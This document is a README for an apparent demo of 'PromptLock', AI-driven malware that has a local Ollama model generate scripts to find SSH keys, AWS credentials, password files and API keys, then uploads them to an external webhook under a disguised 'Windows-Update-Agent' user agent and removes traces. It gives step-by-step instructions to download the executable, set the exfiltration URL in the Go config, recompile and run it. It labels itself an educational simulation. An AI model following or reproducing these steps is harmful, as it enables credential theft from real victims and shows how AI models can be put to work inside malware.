# Data Exfiltration Demo

This demo shows how AI-powered malware can extract sensitive data from a victim's machine without any obvious ransomware behavior.

## How to Run the Demo

1. **Download the malware** from the website: https://promptlock-ransomware-demo.vercel.app
2. **Get a webhook URL** (see below)
3. **Update the malware config** (see below)
4. **Run the executable** and monitor the exfiltration

## How to See the Exfiltrated Data

### Step 1: Get Your Webhook URL
1. Go to: **https://webhook.site**
2. You'll automatically get a unique URL like: `https://webhook.site/ab12cd34-ef56-gh78-...`
3. **Keep this page open** - this is where you'll see the stolen data appear!

### Step 2: Update the Malware (Optional)
The malware is currently configured to send data to a demo webhook. To see the data yourself:

1. Edit `promptlock_executable.go` 
2. Update the `exfiltration_url` in the config:
```go
"exfiltration_url": "https://webhook.site/YOUR-UNIQUE-ID-HERE",
```
3. Recompile: `go build -o promptlock promptlock_executable.go`

### Step 3: Run and Monitor
1. Run the malware executable
2. **Watch the stolen data appear in real-time on webhook.site!** 🎯

The webhook will show:
- Complete JSON payload with all stolen files
- HTTP headers (including the disguised `Windows-Update-Agent` user agent)  
- Timestamp of the exfiltration
- All sensitive data that was "stolen"

### Alternative: Network Monitoring
```bash
# Monitor exfiltration traffic
tcpdump -i any host webhook.site

# Monitor AI traffic  
netstat -an | grep 11434
```

## What Gets Exfiltrated

The malware extracts:
- SSH private keys (`~/.ssh/id_rsa`)
- AWS credentials (`~/.aws/credentials`) 
- Password files (`~/Documents/passwords.txt`)
- API keys (`~/.config/api_keys.json`)
- Financial data (`~/Desktop/financial_data.xlsx`)

## Demo Flow

1. **File Analysis**: AI generates scripts to scan for sensitive files
2. **Data Extraction**: AI creates code to copy sensitive data 
3. **Data Upload**: Malware disguises itself as "Windows Update Agent" and sends data to external server
4. **Cleanup**: AI generates code to remove all traces

The malware sends actual prompts to a local AI model (Ollama) while simultaneously exfiltrating realistic sensitive data to the external webhook server.

## Network Monitoring

You can also monitor the network traffic:
```bash
# Monitor AI traffic
netstat -an | grep 11434

# Monitor exfiltration traffic  
tcpdump -i any host webhook.site
```

## Safety Notes

- This is a **simulation** for educational purposes
- No real data is stolen
- No actual encryption occurs
- All "sensitive data" is fake/demo content
- The AI doesn't generate harmful content - it just receives prompts for logging 